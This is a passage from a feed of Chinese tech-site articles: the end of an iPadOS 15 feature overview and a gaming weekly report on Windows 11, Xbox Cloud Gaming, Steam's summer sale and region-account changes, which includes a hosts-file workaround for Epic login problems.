src=\"https://cdn.sspai.com/2021/06/11/article/161bbfa601c6c8de53b8d558a9bc61a9\"><figcaption>及时回顾网页内容</figcaption></figure><p>除了快速笔记功能，备忘录本身也得到了不小的加强。在共享笔记方面，用户可以通过活动列表查看笔记所有的更新摘要和每个合作者修改的轨迹；还可以在笔记任何的地方向右滑动，查看谁对这边做了哪些修改、修改的日期和时间，且还会使用相同的颜色把该合作者所有修改的地方使用高亮标记出来，更细致的查阅所有修改。和 iOS 15 一样还可以使用 <code>@</code> 来提醒写作者。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/4a635a0658ddb158a7e3d3902cf35dab\"><figcaption>查看活动记录</figcaption></figure><p>在个人使用方面，和 iOS 15 一样加入了标签的支持，用户可以利用标签进一步组织所有的笔记了；还可以创建基于标签的智能文件夹，用户可以打破原有基于文件夹的组织结构，用另外一个视角整理和使用笔记。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/11/article/a154d8afe5c15bea69fd587bc3321421\"><figcaption>笔记应用里的智能文件夹</figcaption></figure><h3>Safari</h3>\n<p>新的 Safari 不仅和 Mac 一样把标签栏和地址栏合二为一，还重新设计了一个新的侧边栏，用户可以在侧边栏中管理标签页、标签组、书签、阅读列表以及所有与你分享等内容，方便用户使用这些功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/9aaa6419c9f8fe57eff7059b631ea73a\"><figcaption>iPad Safari 有了新的侧边栏</figcaption></figure><p>标签组也是 iPadOS 15 里的新功能，用户可以按照类型、实际用途分门别类地保存、组织和管理不同的标签，标签组也支持在 Mac 和 iPhone 上同步，让用户继续完成浏览。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/60c6d84d2d2b9c96a06c22a904322c1c\"><figcaption>标签组功能</figcaption></figure><p>Safari 目前也支持使用网页拓展了，不过大部分都是去广告插件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/d6c59505d01aeee632a237b271ba50ba\"><figcaption>目前大部分还是去广告的插件</figcaption></figure><p>上述大部分功能也在 iOS 15 中进行了更新，iPhone 上的 Safari 浏览器也增加了更多手势操作，比如在地址栏处单指左右滑动，即可快速切换前后标签页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/40af154a7e66fbbf83ce5985b47fbf3d.gif\"><figcaption>iOS 15 中 Safari 滑动地址栏就可以快速切换标签页</figcaption></figure><h3>翻译</h3>\n<p>iPad 上的翻译应用同样姗姗来迟，但也带来了很多新特性。首先，用户只要是能在 iPad 上选中的内容可以点击「翻译」来进行翻译；而那些不能选中的文字还可以使用实况文本，将它转换成可以选中的内容进行翻译；甚至是用户手写的内容也可以被选中翻译。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/5e474782c16ece5200a24dae96278757\"><figcaption>系统级翻译</figcaption></figure><p>iPad 翻译还针对实时翻译场景做了优化，它会自动检测什么时候开始说话以及什么停止说话，进而做到实时翻译的效果；此外，用户还可以调整翻译视图，无论是面对面聊天还是在同侧，总有一种视图适合当下的场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/493200458e6425a82a6c56c49ccbbffe\"><figcaption>无论是并排还是面对面都可以充分利用 iPad 大尺寸的屏幕</figcaption></figure><p>翻译 App 还支持完全离线使用，收藏常用短语和调用内置词典等功能。</p>\n<h3>其它值得关注的 iPadOS 15 新功能</h3>\n<ul>\n<li>使用通用控制可以在 Mac 和 iPad 之间使用同一个鼠标、触摸板和键盘，还可以在 iPad 和 Mac 之间拖放内容；</li>\n<li>iPad 外置键盘快捷栏经过了重新设计，快捷键提示也重新设计，还可以设置更多的键盘快捷方式；</li>\n<li>提醒事项支持自然语义识别、标签和自定义智能列表；</li>\n<li>文件支持读取 NTFS 格式的硬盘，此外复制和移动大量文件时提供进度条；</li>\n<li>未来通过 Swift Playgrounds 可以直接在 iPad 上为 iPhone 和 iPad 开发 app 并提交至 App Store。</li>\n</ul>\n<p>你还发现了哪些 iOS / iPadOS 15 中值得关注的新功能，欢迎在评论区告诉我们。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，阅读更多 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\">WWDC21 专题报道</a> 👨🏻‍💻</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67520"},{"title":"瞎玩菌的游戏周报：Xbox 云游戏、Steam 夏促等","date":"2021-07-02 07:30:26","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.7.2 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>资讯</h2>\n<h3>Windows 11 公布：史上最适合游戏的 Windows</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/69ca6e3c21fc09f659fc49226f1e187d.png\"><figcaption>注：他们真的 <a href=\"https://www.theverge.com/2015/5/7/8568473/windows-10-last-version-of-windows\">这么说过</a></figcaption></figure><p><a href=\"https://blogs.windows.com/windowsexperience/2021/06/24/introducing-windows-11/\">微软</a> 在 6 月 24 日 官宣了 Windows 11。官方宣称这一代操作系统的设计宗旨是「让你更靠近你的所爱」（bring you closer to what you love）。</p>\n<p>在 Windows 11 的官方预告视频（<a href=\"https://www.youtube.com/watch?v=Uh9643c2P6k\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1gb4y1C7Dk\">哔哩哔哩</a>）中，可以看到 Windows 改变了原来的徽标设计，新的田字形窗口变得更加扁平。</p> <p>有不少网友们认为新的 Windows 系统更加趋向于 macOS 的设计风格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/f6f65f07b9fb9293c122f7cd3b8d0f9b.png\"></figure><p>瞎玩菌第一眼看到变化最大的是任务栏，有点像 macOS 的 Dock（两者都是居中的）。其次，Windows 万年不变的字体渲染依然很糟糕，这一点真的可以向 macOS 学习。各位读者对 Windows 11 的第一印象如何？</p>\n<p>由于篇幅限制，对 Windows 11 的系统变化不多介绍，更多信息请阅读少数派的另外两篇文章：</p>\n<ul>\n<li>《<a href=\"https://sspai.com/post/67413\">Windows 11 要更新了，这些变化能让你心动吗？</a>》</li>\n<li>《<a href=\"https://sspai.com/post/67498\">升级 Windows 11 碰壁了？送你一份尝鲜指南</a>》</li>\n</ul>\n<p>在这期游戏周报中，瞎玩菌重点说说 <a href=\"https://news.xbox.com/en-us/2021/06/24/windows-11-the-best-windows-ever-for-gaming/\">Windows 11</a> 与游戏玩家相关的信息。</p>\n<p>游戏一直以来都是 Windows 的根本所在（这是微软的原话：Gaming has always been fundamental to Windows）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/f56f00d234ddaf922f5f426645e940a5.png\"></figure><p>首先 Windows 11 可以让没有 Xbox Series X|S 的玩家也能体验到 Xbox Series X|S 独占的两项技术：</p>\n<ul>\n<li>DirectStorage 提高读写性能，减少加载等待时间。</li>\n<li>Auto HDR 提升画面的明暗动态范围，带来更好的画质。</li>\n</ul>\n<p>另外 Windows 11 支持 DirectX 12 Ultimate，可以在高帧率下实现令人叹为观止、身临其境的图形。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/c9e7544d0046143d30a5e0d9112f40d1.jpg\"></figure><p>随着 Xbox 应用程序现在内置于 Windows 11，访问 Xbox Game Pass 比以往更容易（在 Windows 10 中需要单独下载安装）。上图是 XGP 游戏库中，玩家在今年内就可以玩到的 PC 游戏，这些游戏全部是首发日即登录 XGP。图中的《十二分钟》采用了新公布的游戏海报。今年还有玩家们期待已久的《光环 无限》《帝国时代 4》《极限竞速 地平线 5》等。</p>\n<h3>微软对非游戏内购抽成从 15% 降至 0%，游戏维持 12% 不变</h3>\n<p>作为 Windows 11 公布的一部分，微软还宣布，从 7 月 28 日开始，如果开发者在他们的应用程序中使用自己的或第三方的支付系统（即不使用微软商店的内购 API），微软将让他们保留 100% 的收入。但该协议有一个重要的注意事项：它并不适用于游戏。</p>\n<p>这一信息公布之后，为抽成问题与苹果打官司的 Epic Games CEO Tim Sweeney 都发推称赞：</p>\n<blockquote><p>2021 版的微软是史上最好的微软版本！</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/a9605c731ce12c1245858a64e0fa99f3.png\"><figcaption>图源 <a href=\"https://twitter.com/TimSweeneyEpic/status/1408094368918032386\">Twitter Tim Sweeney</a></figcaption></figure><p>根据之前 Epic 与苹果庭审过程中的爆料，微软一直在亏本销售 Xbox 硬件，因此不难理解为什么微软要坚持对游戏的收入保持 12% 的抽成。</p>\n<h3>Xbox 云游戏开放浏览器游玩，「曲线救国」支持苹果设备和 PC</h3>\n<p>6 月 28 日，<a href=\"https://news.xbox.com/en-us/2021/06/28/xbox-cloud-gaming-now-running-on-xbox-series-x/\">微软</a> 宣布 Xbox 云游戏（Xbox Cloud Gaming，今后瞎玩菌的文章中将采用这一官方名称）终于结束了 4 月开始的邀请制 Beta 测试（当时的名称为 xCloud，跟这里说的是同一个服务），为 22 个国家/地区的 Xbox Game Pass Ultimate 会员开放了这项服务。</p>\n<p>注意：开放的 22 个国家/地区不含中国大陆。这不是开放先后顺序的问题，而是 XGP 本来就没有在中国大陆开放。</p>\n<p>只需在你的 PC 或移动设备上通过微软 Edge、Chrome 或 Safari 浏览器访问 <a href=\"https://xbox.com/play\">xbox.com/play</a>，就可以开始玩 Xbox Game Pass 库中的数百款游戏。这一方式绕过了苹果 App Store 的审核机制。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/666ea49424887a281a6680d03ccd4cff.png\"></figure><p>为此微软发布了 Xbox 云游戏的宣传视频（<a href=\"https://www.youtube.com/watch?v=lHDrZRd7cBc\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV17U4y1V7Sn\">哔哩哔哩</a>）：</p> <p>在此前不久，Xbox 云游戏升级为定制的 Xbox Series X 服务器硬件。硬件升级后，Xbox 云游戏可以提供更快的加载时间、更好的帧率和新一代游戏的体验。为了确保在最广泛的设备上获得最低延迟、最高质量的体验，Xbox 云游戏现在支持 1080p 分辨率和最高 60fps 的速度传输。</p>\n<p>就像你已经拥有一台 Xbox Series X 主机，通过 Xbox 云游戏你一样可以接入 Xbox Live 网络与其他玩家联机，并且支持云存档——你可以在 iPhone 上玩到一半停下来，再到 iPad 上继续玩刚才的进度。</p>\n<p>Xbox 云游戏时除了可以使用定制的触摸屏操作方式，还支持使用游戏手柄。除了兼容的 Xbox 手柄，还可以在 <a href=\"https://support.xbox.com/en-US/help/games-apps/cloud-gaming/cloud-gaming-tested-controllers\">Xbox 官网</a> 查看经过测试支持 Xbox 云游戏的手柄列表，例如：国产厂商 8 位堂的部分手柄，还有 PS4 手柄和 Xbox Backbone One 这样专为手机设计的扩展式手柄。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/d8f0210d979ca6d91e241c8524e303c8.jpg\"><figcaption>Xbox Backbone One 手机手柄，图源 <a href=\"https://news.xbox.com/en-us/2021/06/28/expanding-designed-for-xbox-mobile-accessories/\">Xbox 官网</a></figcaption></figure><p>瞎玩菌个人最推荐的是 Xbox 手柄（官方名称叫 Xbox 无线控制器），它的优势很大：</p>\n<ul>\n<li>玩家们公认的手感最佳，尤其是一分钱一分货的 Xbox 精英手柄。</li>\n<li>无缝兼容 Xbox、PC 和 Apple 设备。根据 <a href=\"https://support.apple.com/zh-cn/HT210414\">Apple 支持官网</a> 的说明，Apple 设备支持的手柄只有 3 种：Xbox 手柄、PS 手柄 和 MFi 手柄。其中 MFi 手柄只有 iOS 专用，不能用于 PC 和 Xbox，因此这是最不通用的选择。而 PS 手柄手感不如 Xbox 手柄。除了 Xbox 云游戏，你还可以用 Xbox 手柄玩 Apple Arcade 游戏，或者 5 月 19 日刚刚登录 iPad 平台的《<a href=\"https://apps.apple.com/hk/app/divinity-original-sin-2/id1458655678\">神界：原罪 2</a>》终极版。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/fc0646ed75662550de7b958630cb74fe.png\"><figcaption>游戏《神界：原罪 2》 图源 <a href=\"https://www.reddit.com/r/DivinityOriginalSin/comments/fxgjg5/happy_fire_voidling_noises/\">reddit Tacska</a></figcaption></figure><ul>\n<li>使用寿命长，我用过的 Xbox 手柄还没有用坏的，至少没遇到过 Switch Joy-con 著名的手柄漂移问题。</li>\n<li>支持 5 号电池/可拆卸的充电电池两种供电方式，不必担心手柄随着电池老化而「强制报废」。后者还支持边充边玩。</li>\n</ul>\n<p>另外，少数派商店上架了来自 imPoi 的 Xbox / PlayStation 的手柄充电底座，目前售价 ￥99，其中 Xbox 款额外送两块充电电池 ，感兴趣的可以戳 <a href=\"https://sspai.com/post/67402\" target=\"_blank\">这里</a> 了解。</p>\n<h3>Steam 夏季大促新史低汇总，《只狼》半价领跑</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/62d4015962d5743f7ec7a4439719e4c7.jpg\"></figure><p>一年一度的 <a href=\"https://store.steampowered.com/?snr=1_2108_9__2107\">Steam 夏季大促</a> 如期来临，从北京时间 2021 年 6 月 25 日凌晨 1 点至 7 月 9 日凌晨 1 点，玩家们有充分的时间来选购自己喜欢的游戏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/6980a6b033de2f91d5aa4888c48942b0.jpeg\"></figure><p>这一次 Steam 开启了名为「<a href=\"https://store.steampowered.com/forgeyourfate?snr=1_2108_9__2107\">命运自己掌握</a>」的活动，有十四个主题页面，内含决定命途的微型冒险，每一个都会最终获得一张动画贴纸，而所有故事最后都会在命运掌握于手的徽章和无限荣耀中达到高潮。</p>\n<p>玩家还可以在点数商店中查看 <a href=\"https://store.steampowered.com/points/shop/c/profilebundles?snr=1_2108_9__2107\">全新游戏个人资料</a>，其中包括您最爱游戏的动画背景、迷你个人资料、头像以及配色方案。</p>\n<p>瞎玩菌为各位汇总了新史低（注：史上最低折扣，并且是第一次达到这么低）的部分游戏清单：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/06886cdf19a848dc5f392b140e165f84.jpeg\"><figcaption>《只狼》的玩法</figcaption></figure><ul>\n<li>《只狼：影逝二度》年度版 ── 134 元（原价 268 元），宫崎英高的游戏性价比极高，据说有些玩家可以玩一辈子</li>\n<li>《极限竞速：地平线 4》── 标准版 94 元（原价 188 元），豪华版 128 元（原价 256 元），终极版 149 元（原价 333 元）</li>\n<li>《古剑奇谭三》 ── 29 元（原价 99 元）</li>\n<li>《Valheim：英灵神殿》 ── 63 元（原价 70 元）</li>\n<li>《尼尔：人工生命 ver.1.22474487139...》── 269 元（原价 359 元）</li>\n<li>《海岛大亨 6》 ── 80 元（原价 160 元）</li>\n<li>《黑帝斯》 ── 56 元（原价 80 元）</li>\n<li>《糖豆人：终极淘汰赛》 ── 34元（原价58元）</li>\n<li>《雨中冒险 2》 ── 53 元（原价 83 元）</li>\n<li>《命令与征服：重制版》 ── 47 元（原价 118 元）</li>\n<li>《天外世界》 ── 79 元（原价 199 元）</li>\n<li>《冰汽时代》── 32 元（原价 99 元）</li>\n<li>《心魔》（The Beast Inside）── 16 元（原价 80 元）</li>\n<li>《逃出生天》（A Way Out）── 39 元（原价 158 元）</li>\n<li>《人中之龙 7 光与暗的去向 国际版》── 252 元（原价 389 元）</li>\n<li>《瘟疫 2》（Pathologic 2）33 元（原价 103 元）</li>\n<li>《底特律：化身为人》 ── 64 元（原价 128 元）</li>\n<li>《四海兄弟：最终版》 ── 83 元（原价 139 元）</li>\n<li>《黑森町绮谭》（Tales of the Black Forest）── 7 元（原价 18 元）</li>\n<li>《中土世界 : 战争之影》 ── 21 元（原价 143 元）</li>\n<li>《动物园之星》 ── 81 元（原价 180 元）</li>\n<li>《星际反叛军》（Star Renegades）── 48 元（原价 80 元）</li>\n<li>《战地 1》 ── 39 元（原价 198 元）</li>\n<li>《战地风云 5》 ── 57 元（原价 228 元）</li>\n<li>《星球大战绝地：陨落的武士团》 ── 79 元（原价 198 元）</li>\n<li>《追忆列车》（NOSTALGIC TRAIN）── 21 元（原价 36 元）</li>\n<li>《112 接线员》 （112 Operator）── 30 元（原价 80 元）</li>\n<li>《泰坦天降 2》 ── 31元（原价 158 元）</li>\n<li>《莱莎的炼金工房２ ～失落传说与秘密妖精～》── 261 元（原价 279 元）</li>\n<li>《最终幻想世界》 ── 66 元（原价 166 元）</li>\n<li>《Haven》── 56 元（原价 80 元）</li>\n<li>《传说之下》（Undertale） ── 10 元（原价 36 元）</li>\n<li>《火炬之光 3》（Torchlight III）── 77 元（原价 210 元）</li>\n<li>《女神异闻录 4：黄金版》 ── 81 元（原价 125 元）</li>\n<li>《开拓者：拥王者》 ── 31 元（原价 70 元）</li>\n<li>《FOCUS on YOU》── 69 元（原价 116 元）</li>\n<li>《胡闹厨房 2》 ── 44 元（原价 98 元）</li>\n<li>《大鹅模拟器》 ── 35 元（原价 70 元）</li>\n<li>《月球坠落时》（Moon Fall） ── 33 元（原价 42 元）</li>\n<li>《赛博朋克 2077》 ── 199 元（原价 298 元）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/7df3b91cf2ec07ac0301d275983667bc.png\"></figure><p>在上期游戏周报的评论中，有位读者提到了 CRPG 经典《博德之门》系列的 1 代和 2 代加强版。这两款游戏也迎来了新史低，分别为 10 元和 13 元。这两款游戏瞎玩菌玩过上百小时，而且平时很少有这么低的折扣，这么便宜买不了吃亏买不了上当，私心推荐。</p>\n<p>即使我列出这么多新史低，依然没有涵盖全面，更别说平史低和其他没有到史低程度但依旧质量很高的游戏。所以欢迎各位玩家在评论中推荐更多值得入手的游戏，或者分享你在这次夏日特卖活动中购买的游戏。</p>\n<h3>Steam 遣返大量「云阿根廷人」，Steam 转区限制从 2 周变为 3 个月</h3>\n<p>6 月 27 日，部分持有 Steam 阿根廷区账号的玩家 <a href=\"https://weibo.com/search?containerid=100103type%3D61%26q%3Dsteam%20%E9%98%BF%E6%A0%B9%E5%BB%B7%26t%3D0\">爆料</a>——他们被 Steam 强制遣返回了中国区。这些账号的共同特点是初始注册所在地是中国，但中途转过区。</p>\n<p>Steam 的低价区策略实行已久，而很多玩家心照不宣地薅起了低价区的羊毛，还有一些玩家到外区是为了购买《<a href=\"https://store.steampowered.com/app/1001630/SUBVERSE/\">Subverse</a>》这类锁中国区的游戏。</p>\n<p>给不了解的玩家科普一下，由于货币汇率等多方面原因，Steam 在阿根廷、俄罗斯等国家/地区设置了比其他地区普遍更低的定价（这不是绝对的，也有游戏定价比中国区还贵），低到了什么程度呢？以一个好懂的数字来说明，中国区一个游戏卖 100 元，在阿根廷区可能就只要 20 元（使用等价值的阿根廷比索购买），碰到夏促这种来个 -50% 不过分吧，那就只要 10 元，最后再把游戏挂卡一卖，实际上最终只花 8 元左右就能买到同一个游戏。你说游戏厂商和抽成  30% 的 Steam 是不是血亏？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/09123191ba5125ccf1c04c32794022eb.jpeg\"></figure><p>目前暂不清楚 Steam 是根据登录 IP 地址还是什么信息来让这些账号遣返，但已知很多阿根廷区和俄罗斯区的原生（指的是注册时就在对应地区）账号没有被遣返。</p>\n<p>其实受到影响最大的还不是中国玩家，据 <a href=\"https://www.gamevicio.com/noticias/2021/06/acabou-a-farra-valve-esta-retornando-usuario-do-steam-argentina-de-volta-para-o-brasil/\">外媒</a> 报道，大量巴西 Steam 玩家也遇到了从阿根廷区遣返回国的情况。 Steam 作为一个全球线上市场，显然薅羊毛不是中国玩家专有的行为，还有 <a href=\"https://www.resetera.com/threads/apparently-valve-did-a-region-rollback-for-several-countries.448783/\">其他外国玩家</a> 也表示遇到了同样的情况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/a8adf8cc9662e77189f86cf7dce905af.jpeg\"></figure><p>同时 Steam 还修改了账号转区的规定，冷却时间从之前的 2 个星期变成了 3 个月。</p>\n<p>Steam 在夏促期间动手，显然是因为这种行为损害了游戏厂商和 Steam 平台的利益。一名开发商晒出了后台销售数据：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/2f5ebb1296e847e427b8a7e7975e75d1.png\"><figcaption>图源 <a href=\"https://twitter.com/LorenLemcke/status/1406134596622823428\">Twitter LorenLemcke</a></figcaption></figure><p>它的游戏有 82% 的销量来自于定价最低的阿根廷区。这位开发商还发出善意提示：</p>\n<blockquote><p>当你因为区域性定价而搞砸 Steam 时，你也在搞砸开发者。</p></blockquote>\n<h3>Steam 销量榜大变天，「给他爱 5」下榜，微软独孤求败</h3>\n<p>截止到 6 月 27 日，Steam 夏促开始后的第一个 <a href=\"https://store.steampowered.com/feeds/weeklytopsellers.xml\">一周销量排行榜</a> 公布了。</p>\n<p>刚刚迎来大规模内容更新的《盗贼之海》占据榜首，而首次登录 Steam 的《极限竞速 地平线 4》两个版本都进入了榜单，还有《光环：士官长合集》占据了第 5 名。具体排名如下：</p>\n<ol>\n<li>《盗贼之海》</li>\n<li>《只狼 影逝二度》年度版</li>\n<li>《地平线 零之曙光》完整版</li>\n<li>《极限竞速 地平线 4》标准版</li>\n<li>《光环：士官长合集》</li>\n<li>Valve Index VR 套件</li>\n<li>《绝地求生》</li>\n<li>《腐蚀》</li>\n<li>《极限竞速 地平线 4》终极版</li>\n<li>《双人成行》</li>\n</ol>\n<p>《GTA 5》又一次掉出前 10 名。所以说 R 星你的《GTA 6》搞快点吧！</p>\n<h3>尽量一句话新闻</h3>\n<p>为控制游戏周报的篇幅，并保持足够的信息量，本期开始加入「尽量一句话新闻」的环节。大部分时候瞎玩菌尽量用一句话浓缩信息，偶尔也会不止一句话。读者可以点击链接以了解更多信息。</p>\n<ul>\n<li>索尼收购《Returnal》开发商 <a href=\"https://blog.playstation.com/2021/06/29/welcoming-housemarque-to-the-playstation-studios-family/\">Housemarque</a><strong> </strong>工作室。</li>\n<li>\n<a href=\"https://twitter.com/timistudios/status/1407797718366384129\">腾讯</a> 成立天美西雅图工作室，专攻 3A 级别 FPS 游戏。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/e3582d22ad8b0e918f0ce7b7e5a33efd.jpeg\"></figure><ul>\n<li>\n<a href=\"https://twitter.com/N_Officialstore/status/1407885413881159682\">任天堂</a> 将通过快闪店，以扭蛋机的形式发售一套红白机、NES 主题的周边挂件，单个售价 500 日元，外形小巧可爱。</li>\n<li>国行 Switch《马力欧卡丁车 8 豪华版》<a href=\"https://weibo.com/7229718199/KmrZJqJi5\">海选赛</a> 结束，16 支战队晋级 <a href=\"https://weibo.com/7229718199/Kmrso8Ta9\">常规赛</a>，7 月 2 日到 18 日将全程 <a href=\"https://weibo.com/7229718199/KmrJAxrZp\">直播</a>。</li>\n<li>国行 Switch《<a href=\"https://weibo.com/7229718199/KmoI4a1Z6\">耀西的手工世界</a>》将于 7 月 9 日发售，官方建议零售价 299 元。</li>\n<li>Switch 版《<a href=\"https://www.nintendo.com/games/detail/sky-children-of-the-light-switch/\">Sky 光遇</a>》现已上架，可免费游玩，大小为 2.5GB，支持中文，并支持跨平台联机。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/5a0cfcb6f3246e293834809eca1674a5.jpeg\"><figcaption>图源 <a href=\"https://www.reddit.com/r/AyyMD/comments/c0peex/worlds_most_powerful_memes_are_powered_by_amd/\">reddit DingoKis</a></figcaption></figure><ul>\n<li>AMD FSR 技术支持的游戏和 GPU，还有实测效果对比，推荐阅读少数派两位作者@Tiger5G 和@广陵止息 联合创作的文章《<a href=\"https://sspai.com/post/67469\">老显卡也能拥有的新体验：AMD FSR 实测</a>》。即使 Nvidia 家的 GTX 1060 老显卡也能使用 AMD FSR 技术。</li>\n<li>AMD FSR 技术已支持 <a href=\"https://twitter.com/jronald/status/1408156048179879936\">微软</a> 的 Xbox Series X|S 和 Xbox One。</li>\n<li>《Baba is You》登录 <a href=\"https://play.google.com/store/apps/details?id=org.hempuli.baba\">Android</a> 与 <a href=\"https://itunes.apple.com/us/app/id1517281887\">iOS</a> 平台，售价 6.99 美元。</li>\n<li>《<a href=\"https://www.monsterhunter.com/stories2/cn/topics/demo/\">怪物猎人物语 2：破灭之翼</a>》的免费试玩版现已上架 Switch eShop 商店，Steam 版将于 7 月 9 日发布。</li>\n</ul>\n<h2>彩蛋</h2>\n<h3>🌈🥚1 Switch 版《<a href=\"https://www.nintendo.com/games/detail/calculator-switch/\">计算器</a>》史低了：-80% 折扣，美服 1.99 美元（原价 9.99 美元），约合人民币 12.71 元</h3>\n<p>不过全球最低价在波兰区，售价 7.20 兹罗提，约合人民币 12.49 元。</p>\n<p>作为一款终极炒冷饭作品，上手门槛低，全开放结局，自由度极高。</p>\n<p>希望开发者后续能推出 DLC，加入按键中文语音提示，以实现瞎玩菌最期待的「归归归归归归归零」玩法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/e512944e12b3490dcfb7187f15594ff3.jpeg\"></figure><h3>🌈🥚2 针对部分用户无法领取 Epic 商城免费游戏的解决办法</h3>\n<p>根据 <a href=\"https://weibo.com/7287111107/Km95fF3Ob\">Epic 游戏商城</a> 官方微博，含四川电信在内的部分用户无法登录以领取免费游戏。经调查是在hCaptcha验证时出问题了。<a href=\"https://weibo.com/7287111107/KmfftkcHC\">解决办法</a> 是在 hosts 文件里加入以下内容：</p>\n<pre class=\"language-null\"><code>104.16.168.131 hcaptcha.com\n104.16.168.131 newassets.hcaptcha.com\n104.16.168.131 imgs.hcaptcha.com</code></pre>\n<p>望 PC 玩家朋友们互相转告。</p>\n<h3>🌈🥚3 日本玩家用 Switch 游戏《附带导航！一做就上手第一次的游戏程序设计》自制脑洞竞速游戏</h3>\n<p>游戏的主角是一只会漂移的 Joy-con 手柄。注意漂移是指漂移过弯，不是你们想的那样。</p>\n<p>想玩的话可以查找游戏 ID：G 008 KG3 73F</p>\n<p>操作方式：左摇杆控制方向，右摇杆控制加速，按键漂移。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/8d74d493a1d42c37cbfeb9acd176c173.gif\"><figcaption>游戏录屏。图源 <a href=\"https://twitter.com/puchipuchi3g/status/1405653927446470656\">Twitter ぷちぷち@まったりマイペース</a></figcaption></figure><h3>🌈🥚4 索尼克 30 周年，微软、世嘉联合搞纪念活动</h3>\n<p>2021 年 6 月 23 日是索尼克 30 周年的日子。在 30 年前，世嘉主机上发布了《刺猬索尼克》，开启了游戏的新纪元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/05ed09169ff84a76aa21276b786d2fde.jpg\"></figure><p>《我的世界》推出了与世嘉官方联动的 DLC 「索尼克」（官方宣传视频：<a href=\"https://www.youtube.com/watch?v=5Mb9ijO_740\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1XV411s75h\">哔哩哔哩</a>）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/38dd9af985139b759cd5d1c6bfc7f2ef.jpeg\"></figure><p>世嘉举办了《索尼克 30 周年音乐会》（全程视频：<a href=\"https://www.youtube.com/watch?v=UGTlBHNvjsU\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1a64y197s4\">哔哩哔哩</a>）。</p>\n<h3>🌈🥚5 <a href=\"https://twitter.com/nguyenhut_art/status/1406938568489013253\">动森玩家</a> 自制同人图，点击链接还能欣赏到一小段 3D 动画</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/fe7a6d4ed33820aaf3e307b71f1af8e2.jpeg\"><figcaption>图源 <a href=\"https://twitter.com/nguyenhut_art/status/1407004622007390210\">Twitter Nguyen Nhut</a></figcaption></figure><h3>🌈🥚6 《赛博朋克酒保行动》玩家二创游戏《Jill's Day》体验版</h3>\n<p>为了给原作主角 Jill 庆祝生日，<a href=\"https://twitter.com/takuyahasonmin/status/1408802229914533888\">玩家</a> 自制了这款 GameBoy 画风的网页游戏，位于 <a href=\"https://guanoice.itch.io/jillsdaydemo\">itch.io</a>，你可以使用浏览器免费游玩。</p>\n<p>目前仅支持日文，但开发者称已经找到了 3 